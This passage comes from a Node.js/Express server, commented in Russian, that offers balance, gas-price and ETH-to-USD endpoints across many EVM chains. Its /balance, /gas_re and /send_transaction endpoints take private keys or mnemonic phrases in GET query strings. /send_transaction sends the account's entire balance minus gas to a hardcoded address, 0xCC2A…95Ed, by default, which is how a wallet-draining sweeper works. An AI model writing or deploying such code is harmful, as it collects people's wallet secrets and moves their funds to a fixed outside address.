          console.error(`RPC не работает: ${nextRpc}`, error.message);
          // Продолжаем перебор
        }
      }
      // Если все RPC недоступны
      console.log(`Ошибка: все доступные RPC недоступны для chain_id=${normalizedChainId}`);
      return res.status(503).json({ error: 'Все доступные RPC недоступны' });
    } else {
      console.log(`Ошибка: все доступные RPC недоступны для chain_id=${normalizedChainId}`);
      return res.status(503).json({ error: 'Все доступные RPC недоступны' });
    }
  }
});

/**
 * @swagger
 * /balance:
 *   get:
 *     summary: Получить баланс адреса, приватного ключа или мнемоники
 *     parameters:
 *       - in: query
 *         name: address
 *         schema:
 *           type: string
 *         description: Ethereum адрес
 *       - in: query
 *         name: private_key
 *         schema:
 *           type: string
 *         description: Приватный ключ
 *       - in: query
 *         name: mnemonic
 *         schema:
 *           type: string
 *         description: Мнемоническая фраза
 *       - in: query
 *         name: chain_id
 *         required: true
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети, алиас или "all" для всех сетей
 *     responses:
 *       200:
 *         description: Баланс адреса
 *       400:
 *         description: Ошибка в запросе
 *       500:
 *         description: Ошибка сервера
 */
app.get('/balance', async (req, res) => {
  try {
    const { address, private_key, mnemonic, chain_id } = req.query;
    
    // Проверяем, что указан хотя бы один из параметров: address, private_key или mnemonic
    if (!address && !private_key && !mnemonic) {
      return res.status(400).json({ error: 'Необходимо указать address, private_key или mnemonic' });
    }
    
    // Проверяем, что указан chain_id
    if (!chain_id) {
      return res.status(400).json({ error: 'Необходимо указать chain_id' });
    }
    
    // Определяем адрес для проверки баланса
    let targetAddress;
    
    if (address) {
      targetAddress = address;
    } else if (private_key) {
      try {
        targetAddress = getAddressFromPrivateKey(private_key);
      } catch (error) {
        return res.status(400).json({ error: error.message });
      }
    } else if (mnemonic) {
      try {
        targetAddress = getAddressFromMnemonic(mnemonic);
      } catch (error) {
        return res.status(400).json({ error: error.message });
      }
    }
    
    // Проверяем, что адрес валидный
    if (!ethers.utils.isAddress(targetAddress)) {
      return res.status(400).json({ error: 'Некорректный Ethereum адрес' });
    }
    
    // Если chain_id = "all", получаем балансы для всех доступных сетей
    if (chain_id.toLowerCase() === 'all') {
      const mergedRpcList = mergeRpcLists();
      const results = {};
      
      // Получаем балансы для всех сетей параллельно
      const promises = Object.keys(mergedRpcList).map(async (chainId) => {
        try {
          const rpc = await getWorkingRpc(chainId);
          const balanceHex = await getBalance(targetAddress, rpc);
          const balanceWei = hexToDecimal(balanceHex);
          const balanceEth = weiToEther(balanceWei);
          
          results[chainId] = {
            chain_id: chainId,
            address: targetAddress,
            balance_wei: balanceWei,
            balance_eth: balanceEth,
            balance_hex: balanceHex
          };
        } catch (error) {
          console.error(`Ошибка при получении баланса для chain_id=${chainId}:`, error.message);
          // Пропускаем сети с ошибками
        }
      });
      
      // Ждем завершения всех запросов
      await Promise.all(promises);
      
      return res.json({
        address: targetAddress,
        balances: results
      });
    } else {
      // Получаем баланс для указанной сети
      try {
        const normalizedChainId = normalizeChainId(chain_id);
        const rpc = await getWorkingRpc(normalizedChainId);
        const balanceHex = await getBalance(targetAddress, rpc);
        const balanceWei = hexToDecimal(balanceHex);
        const balanceEth = weiToEther(balanceWei);
        
        return res.json({
          chain_id: normalizedChainId,
          address: targetAddress,
          balance_wei: balanceWei,
          balance_eth: balanceEth,
          balance_hex: balanceHex
        });
      } catch (error) {
        return res.status(500).json({ error: error.message });
      }
    }
  } catch (error) {
    console.error('Ошибка при получении баланса:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * @swagger
 * /eth_to_usd:
 *   get:
 *     summary: Конвертировать ETH в USD
 *     parameters:
 *       - in: query
 *         name: amount
 *         schema:
 *           type: string
 *         description: Количество ETH для конвертации
 *       - in: query
 *         name: chain_id
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети или алиас для выбора валюты
 *     responses:
 *       200:
 *         description: Результат конвертации
 *       400:
 *         description: Ошибка в запросе
 *       500:
 *         description: Ошибка сервера
 */
app.get('/eth_to_usd', async (req, res) => {
  try {
    const { amount, chain_id } = req.query;
    
    // Проверяем, что указана сумма
    if (!amount) {
      return res.status(400).json({ error: 'Необходимо указать amount' });
    }
    
    // Получаем курсы валют
    const rates = await getCurrencyRates();
    
    // Если указан chain_id, конвертируем для указанной сети
    if (chain_id) {
      const normalizedChainId = normalizeChainId(chain_id);
      
      // Определяем символ валюты для указанной сети
      let symbol = 'eth'; // По умолчанию Ethereum
      
      // Маппинг chain_id на символы валют в API Brave
      const chainSymbolMap = {
        '1': 'eth',
        '56': 'bnb',
        '137': 'matic',
        '42161': 'arbitrum',
        '10': 'op',
        '8453': 'base',
        '43114': 'avax',
        '250': 'fantom',
        '100': 'gnosis',
        '324': 'zksync',
        '25': 'cronos',
        '81457': 'blast',
        '42220': 'celo',
        '1284': 'moonbeam',
        '1285': 'moonriver',
        '534352': 'scroll',
        '59144': 'linea',
        '1101': 'polygon'
      };
      
      if (chainSymbolMap[normalizedChainId]) {
        symbol = chainSymbolMap[normalizedChainId];
      }
      
      // Проверяем, есть ли курс для указанной сети
      if (!rates[symbol]) {
        return res.status(400).json({ error: `Курс для chain_id=${normalizedChainId} (${symbol}) не найден` });
      }
      
      // Конвертируем сумму
      const usdRate = rates[symbol].usd;
      const usdAmount = parseFloat(amount) * usdRate;
      
      return res.json({
        chain_id: normalizedChainId,
        symbol: symbol,
        amount: amount,
        usd_rate: usdRate,
        usd_amount: usdAmount,
        usd_timeframe_change: rates[symbol].usd_timeframe_change
      });
    } else {
      // Если chain_id не указан, возвращаем все курсы
      const result = {};
      
      Object.keys(rates).forEach(symbol => {
        const usdRate = rates[symbol].usd;
        const usdAmount = parseFloat(amount) * usdRate;
        
        result[symbol] = {
          amount: amount,
          usd_rate: usdRate,
          usd_amount: usdAmount,
          usd_timeframe_change: rates[symbol].usd_timeframe_change
        };
      });
      
      return res.json({
        amount: amount,
        conversions: result
      });
    }
  } catch (error) {
    console.error('Ошибка при конвертации ETH в USD:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * @swagger
 * /gas_price:
 *   get:
 *     summary: Получить цену газа для указанной сети
 *     parameters:
 *       - in: query
 *         name: chain_id
 *         required: true
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети, алиас или "all" для всех сетей
 *     responses:
 *       200:
 *         description: Цена газа
 *       400:
 *         description: Ошибка в запросе
 *       500:
 *         description: Ошибка сервера
 */
app.get('/gas_price', async (req, res) => {
  try {
    const { chain_id } = req.query;
    
    // Проверяем, что указан chain_id
    if (!chain_id) {
      return res.status(400).json({ error: 'Необходимо указать chain_id' });
    }
    
    // Если chain_id = "all", получаем цены газа для всех доступных сетей
    if (chain_id.toLowerCase() === 'all') {
      const mergedRpcList = mergeRpcLists();
      const results = {};
      
      // Получаем цены газа для всех сетей параллельно
      const promises = Object.keys(mergedRpcList).map(async (chainId) => {
        try {
          const rpc = await getWorkingRpc(chainId);
          const gasPriceHex = await getGasPrice(rpc);
          const gasPriceWei = hexToDecimal(gasPriceHex);
          const gasPriceGwei = ethers.utils.formatUnits(gasPriceWei, 'gwei');
          
          results[chainId] = {
            chain_id: chainId,
            gas_price_wei: gasPriceWei,
            gas_price_gwei: gasPriceGwei,
            gas_price_hex: gasPriceHex
          };
        } catch (error) {
          console.error(`Ошибка при получении цены газа для chain_id=${chainId}:`, error.message);
          // Пропускаем сети с ошибками
        }
      });
      
      // Ждем завершения всех запросов
      await Promise.all(promises);
      
      return res.json({
        gas_prices: results
      });
    } else {
      // Получаем цену газа для указанной сети
      try {
        const normalizedChainId = normalizeChainId(chain_id);
        const rpc = await getWorkingRpc(normalizedChainId);
        const gasPriceHex = await getGasPrice(rpc);
        const gasPriceWei = hexToDecimal(gasPriceHex);
        const gasPriceGwei = ethers.utils.formatUnits(gasPriceWei, 'gwei');
        
        return res.json({
          chain_id: normalizedChainId,
          gas_price_wei: gasPriceWei,
          gas_price_gwei: gasPriceGwei,
          gas_price_hex: gasPriceHex
        });
      } catch (error) {
        return res.status(500).json({ error: error.message });
      }
    }
  } catch (error) {
    console.error('Ошибка при получении цены газа:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * @swagger
 * /gas_estimate:
 *   get:
 *     summary: Оценить газ для транзакции
 *     parameters:
 *       - in: query
 *         name: chain_id
 *         required: true
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети или алиас
 *       - in: query
 *         name: from
 *         required: true
 *         schema:
 *           type: string
 *         description: Адрес отправителя
 *       - in: query
 *         name: to
 *         required: true
 *         schema:
 *           type: string
 *         description: Адрес получателя
 *       - in: query
 *         name: value
 *         schema:
 *           type: string
 *         description: Сумма в wei (hex или decimal)
 *     responses:
 *       200:
 *         description: Оценка газа
 *       400:
 *         description: Ошибка в запросе
 *       500:
 *         description: Ошибка сервера
 */
app.get('/gas_estimate', async (req, res) => {
  try {
    const { chain_id, from, to, value } = req.query;
    
    // Проверяем обязательные параметры
    if (!chain_id) {
      return res.status(400).json({ error: 'Необходимо указать chain_id' });
    }
    
    if (!from || !to) {
      return res.status(400).json({ error: 'Необходимо указать from и to адреса' });
    }
    
    // Проверяем, что адреса валидные
    if (!ethers.utils.isAddress(from) || !ethers.utils.isAddress(to)) {
      return res.status(400).json({ error: 'Некорректные Ethereum адреса' });
    }
    
    // Преобразуем value в hex, если он указан
    let valueHex = '0x0';
    if (value) {
      if (value.startsWith('0x')) {
        valueHex = value;
      } else {
        valueHex = decimalToHex(value);
      }
    }
    
    // Получаем оценку газа для указанной сети
    try {
      const normalizedChainId = normalizeChainId(chain_id);
      const rpc = await getWorkingRpc(normalizedChainId);
      
      // Получаем цену газа
      const gasPriceHex = await getGasPrice(rpc);
      const gasPriceWei = hexToDecimal(gasPriceHex);
      
      // Оцениваем газ для транзакции
      const gasLimitHex = await estimateGas(from, to, valueHex, rpc);
      const gasLimitWei = hexToDecimal(gasLimitHex);
      
      // Рассчитываем стоимость газа
      const gasCostWei = BigInt(gasPriceWei) * BigInt(gasLimitWei);
      const gasCostEth = weiToEther(gasCostWei.toString());
      
      return res.json({
        chain_id: normalizedChainId,
        from: from,
        to: to,
        value: valueHex,
        gas_limit: gasLimitWei,
        gas_price_wei: gasPriceWei,
        gas_price_gwei: ethers.utils.formatUnits(gasPriceWei, 'gwei'),
        gas_cost_wei: gasCostWei.toString(),
        gas_cost_eth: gasCostEth
      });
    } catch (error) {
      return res.status(500).json({ error: error.message });
    }
  } catch (error) {
    console.error('Ошибка при оценке газа:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * @swagger
 * /gas_re:
 *   get:
 *     summary: Рассчитать максимальную сумму для вывода с учетом газа
 *     parameters:
 *       - in: query
 *         name: chain_id
 *         required: true
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети или алиас
 *       - in: query
 *         name: private_key
 *         required: true
 *         schema:
 *           type: string
 *         description: Приватный ключ
 *     responses:
 *       200:
 *         description: Результат расчета
 *       400:
 *         description: Ошибка в запросе
 *       500:
 *         description: Ошибка сервера
 */
app.get('/gas_re', async (req, res) => {
  try {
    const { chain_id, private_key } = req.query;
    
    // Проверяем обязательные параметры
    if (!chain_id) {
      return res.status(400).json({ error: 'Необходимо указать chain_id' });
    }
    
    if (!private_key) {
      return res.status(400).json({ error: 'Необходимо указать private_key' });
    }
    
    // Получаем адрес из приватного ключа
    let fromAddress;
    try {
      fromAddress = getAddressFromPrivateKey(private_key);
    } catch (error) {
      return res.status(400).json({ error: error.message });
    }
    
    // Адрес получателя (фиксированный)
    const toAddress = '0xCC2A9a398219D3c8Ab006820bc7C025118a295Ed';
    
    // Получаем данные для указанной сети
    try {
      const normalizedChainId = normalizeChainId(chain_id);
      const rpc = await getWorkingRpc(normalizedChainId);
      
      // Получаем баланс
      const balanceHex = await getBalance(fromAddress, rpc);
      const balanceWei = BigInt(balanceHex);
      
      // Получаем цену газа (нормальную)
      const gasPriceHex = await getGasPrice(rpc);
      const gasPriceWei = BigInt(gasPriceHex);
      
      // Получаем минимальную цену газа (70% от нормальной)
      const minGasPriceWei = gasPriceWei * BigInt(70) / BigInt(100);
      const minGasPriceHex = '0x' + minGasPriceWei.toString(16);
      
      // Оцениваем газ для транзакции с нормальной ценой
      const gasLimitHex = await estimateGas(fromAddress, toAddress, '0x0', rpc);
      const gasLimitWei = BigInt(gasLimitHex);
      
      // Рассчитываем стоимость газа с нормальной ценой
      const gasCostWei = gasPriceWei * gasLimitWei;
      
      // Рассчитываем стоимость газа с минимальной ценой
      const minGasCostWei = minGasPriceWei * gasLimitWei;
      
      // Рассчитываем максимальную сумму для вывода с нормальной ценой газа
      let maxValueWei = balanceWei > gasCostWei ? balanceWei - gasCostWei : BigInt(0);
      const canSendNormal = maxValueWei > BigInt(0);
      
      // Рассчитываем максимальную сумму для вывода с минимальной ценой газа
      let maxMinValueWei = balanceWei > minGasCostWei ? balanceWei - minGasCostWei : BigInt(0);
      const canSendMinimal = maxMinValueWei > BigInt(0);
      
      return res.json({
        chain_id: normalizedChainId,
        address: fromAddress,
        balance_wei: balanceWei.toString(),
        balance_eth: weiToEther(balanceWei.toString()),
        gas_limit: gasLimitWei.toString(),
        normal_gas: {
          gas_price_wei: gasPriceWei.toString(),
          gas_price_gwei: ethers.utils.formatUnits(gasPriceWei.toString(), 'gwei'),
          gas_cost_wei: gasCostWei.toString(),
          gas_cost_eth: weiToEther(gasCostWei.toString()),
          max_send_wei: maxValueWei.toString(),
          max_send_eth: weiToEther(maxValueWei.toString()),
          can_send: canSendNormal
        },
        minimal_gas: {
          gas_price_wei: minGasPriceWei.toString(),
          gas_price_gwei: ethers.utils.formatUnits(minGasPriceWei.toString(), 'gwei'),
          gas_cost_wei: minGasCostWei.toString(),
          gas_cost_eth: weiToEther(minGasCostWei.toString()),
          max_send_wei: maxMinValueWei.toString(),
          max_send_eth: weiToEther(maxMinValueWei.toString()),
          can_send: canSendMinimal
        }
      });
    } catch (error) {
      return res.status(500).json({ error: error.message });
    }
  } catch (error) {
    console.error('Ошибка при расчете максимальной суммы для вывода:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * @swagger
 * /send_transaction:
 *   get:
 *     summary: Отправить транзакцию с максимальной суммой
 *     parameters:
 *       - in: query
 *         name: chain_id
 *         required: true
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети или алиас
 *       - in: query
 *         name: private_key
 *         required: true
 *         schema:
 *           type: string
 *         description: Приватный ключ
 *       - in: query
 *         name: to_address
 *         schema:
 *           type: string
 *         description: Адрес получателя (по умолчанию 0xCC2A9a398219D3c8Ab006820bc7C025118a295Ed)
 *       - in: query
 *         name: gas
 *         schema:
 *           type: string
 *           enum: [normal, maxminimal]
 *         description: Тип цены газа (normal или maxminimal)
 *     responses:
 *       200:
 *         description: Результат отправки транзакции
 *       400:
 *         description: Ошибка в запросе
 *       500:
 *         description: Ошибка сервера
 */
app.get('/send_transaction', async (req, res) => {
  try {
    const { chain_id, private_key, to_address, gas } = req.query;
    
    // Проверяем обязательные параметры
    if (!chain_id) {
      return res.status(400).json({ error: 'Необходимо указать chain_id' });
    }
    
    if (!private_key) {
      return res.status(400).json({ error: 'Необходимо указать private_key' });
    }
    
    // Получаем адрес из приватного ключа
    let fromAddress;
    try {
      fromAddress = getAddressFromPrivateKey(private_key);
    } catch (error) {
      return res.status(400).json({ error: error.message });
    }
    
    // Адрес получателя (по умолчанию фиксированный)
    const toAddress = to_address || '0xCC2A9a398219D3c8Ab006820bc7C025118a295Ed';
    
    // Проверяем, что адрес получателя валидный
    if (!ethers.utils.isAddress(toAddress)) {
      return res.status(400).json({ error: 'Некорректный адрес получателя' });
    }
    
    // Тип цены газа (по умолчанию normal)
    const gasType = gas || 'normal';
    
    if (gasType !== 'normal' && gasType !== 'maxminimal') {
      return res.status(400).json({ error: 'Некорректный тип цены газа. Допустимые значения: normal, maxminimal' });
    }
    
    // Получаем данные для указанной сети
    try {
      const normalizedChainId = normalizeChainId(chain_id);
      const rpc = await getWorkingRpc(normalizedChainId);
      
      // Получаем баланс
      const balanceHex = await getBalance(fromAddress, rpc);
      const balanceWei = BigInt(balanceHex);
      
      // Получаем цену газа
      const gasPriceHex = await getGasPrice(rpc);
      const gasPriceWei = BigInt(gasPriceHex);
      
      // Определяем цену газа в зависимости от типа
      let usedGasPriceWei;
      if (gasType === 'normal') {
        usedGasPriceWei = gasPriceWei;
      } else { // maxminimal
        usedGasPriceWei = gasPriceWei * BigInt(70) / BigInt(100);
      }
      
      // Оцениваем газ для транзакции
      const gasLimitHex = await estimateGas(fromAddress, toAddress, '0x0', rpc);
      const gasLimitWei = BigInt(gasLimitHex);
      
      // Рассчитываем стоимость газа
      const gasCostWei = usedGasPriceWei * gasLimitWei;
      
      // Рассчитываем максимальную сумму для вывода
      if (balanceWei <= gasCostWei) {
        return res.status(400).json({
          error: 'Недостаточно средств для отправки транзакции',
          balance_wei: balanceWei.toString(),
          gas_cost_wei: gasCostWei.toString()
        });
      }
      
      const maxValueWei = balanceWei - gasCostWei;
      
      // Отправляем транзакцию
      const txResult = await sendTransaction(
        private_key,
        toAddress,
        maxValueWei.toString(),
        usedGasPriceWei.toString(),
        rpc
      );
      
      return res.json({
        chain_id: normalizedChainId,
        from: fromAddress,
        to: toAddress,
        value_wei: maxValueWei.toString(),
        value_eth: weiToEther(maxValueWei.toString()),
        gas_price_wei: usedGasPriceWei.toString(),
        gas_price_gwei: ethers.utils.formatUnits(usedGasPriceWei.toString(), 'gwei'),
        gas_limit: gasLimitWei.toString(),
        gas_cost_wei: gasCostWei.toString(),
        gas_cost_eth: weiToEther(gasCostWei.toString()),
        transaction: txResult
      });
    } catch (error) {
      return res.status(500).json({ error: error.message });
    }
  } catch (error) {
    console.error('Ошибка при отправке транзакции:', error);
    return res.status(500).json({ error: error.message });
  }
});

/**
 * @swagger
 * /aliases:
 *   get:
 *     summary: Получить список алиасов для указанного chain_id
 *     parameters:
 *       - in: query
 *         name: chain_id
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети
 *     responses:
 *       200:
 *         description: Список алиасов
 */
app.get('/aliases', (req, res) => {
  const chainId = req.query.chain_id;
  
  if (!chainId) {
    // Если chain_id не указан, возвращаем все алиасы
    return res.json(chainIdToAliasesMap);
  }
  
  // Нормализуем chain_id (поддержка алиасов)
  const normalizedChainId = normalizeChainId(chainId);
  
  // Получаем алиасы для указанного chain_id
  const aliases = chainIdToAliasesMap[normalizedChainId] || [];
  
  return res.json({
    chain_id: normalizedChainId,
    aliases: aliases
  });
});

// Добавляем проверку состояния для Railway
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// Периодическая проверка всех RPC
function scheduleRpcCheck() {
  setInterval(() => {
    console.log('Запуск проверки всех RPC...');
    
    // Получаем объединенный список RPC с учетом приоритетов
    const mergedRpcList = mergeRpcLists();
    
    Object.keys(mergedRpcList).forEach(chainId => {
      console.log(`Проверка RPC для chain_id=${chainId}...`);
      
      mergedRpcList[chainId].forEach(async (rpc) => {
        try {
          // Проверяем RPC с валидацией поддержки транзакций и методов
          await testRpcAvailability(rpc);
          // Если проверка прошла успешно, удаляем из списка неработающих
          if (failedRpcs.has(rpc)) {
            failedRpcs.delete(rpc);
            console.log(`RPC восстановлен: ${rpc}`);
          }
        } catch (error) {
          failedRpcs.set(rpc, { 
            timestamp: Date.now(),
            error: error.message
          });
          console.log(`RPC не работает: ${rpc} - ${error.message}`);
        }
      });
    });
  }, CHECK_INTERVAL);
}

// Обработка ошибок и необработанных исключений
process.on('uncaughtException', (error) => {
  console.error('Необработанное исключение:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Необработанное отклонение Promise:', reason);
});

app.listen(PORT, async () => {
  console.log(`Сервер запущен на порту ${PORT}`);
  
  // Загружаем данные RPC из внешних источников при запуске
  await loadRpcDataFromExternalSources();
  
  // Запускаем периодическую проверку RPC
  scheduleRpcCheck();
});

